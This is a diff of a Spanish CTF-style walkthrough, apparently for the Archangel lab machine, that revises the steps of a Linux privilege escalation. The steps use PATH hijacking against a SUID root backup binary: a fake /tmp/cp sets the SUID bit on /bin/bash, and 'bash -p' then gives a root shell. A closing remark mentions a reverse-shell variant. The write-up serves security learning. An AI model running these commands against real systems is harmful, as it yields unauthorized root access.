@@ -165,25 +165,30 @@ Paso 3: Desde la máquina víctima
 ```bash 
 -rwsr-xr-x 1 root root    /home/archangel/secret/backup
 
-❯ /home/archangel/secret/backup
-# Lo que se ve es que llama a 'CP' sin ruta absoluta
-	cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+Paso 1:
+# Mirar el cotenido 
+❯ strings /home/archangel/secret/backup
+	cp /home/user/archangel/myfiles/* /opt/backupfiles 
+	# Lo que se ve es que llama a 'CP' sin ruta absoluta
 
-Paso 1: Hacer un 'Path Hijacking'
-# Creas el cp falso en /tmp
+Paso 2: Hacer un 'Path Hijacking'
+# Crear el 'cp' falso en el dir /tmp
 ❯ echo '#!/bin/bash' > /tmp/cp
 ❯ echo 'chmod +s /bin/bash' >> /tmp/cp
 ❯ chmod +x /tmp/cp
 
-Paso 2:
-# Modificas el PATH
+Paso 3:
+# Modificar el PATH para que primero busque en '/tmp'
 ❯ export PATH=/tmp:$PATH
 
-Paso 3:
-❯ /home/archangel/secret/backup
-
 Paso 4:
+❯ /home/archangel/secret/backup    # Ejecutar 
+
+Paso 5:
 # Escalas
 ❯ /bin/bash -p
 ❯ whoami
+
+NOTA: 
+	- Tambien se puede hacer en forma de revershell 
 ```
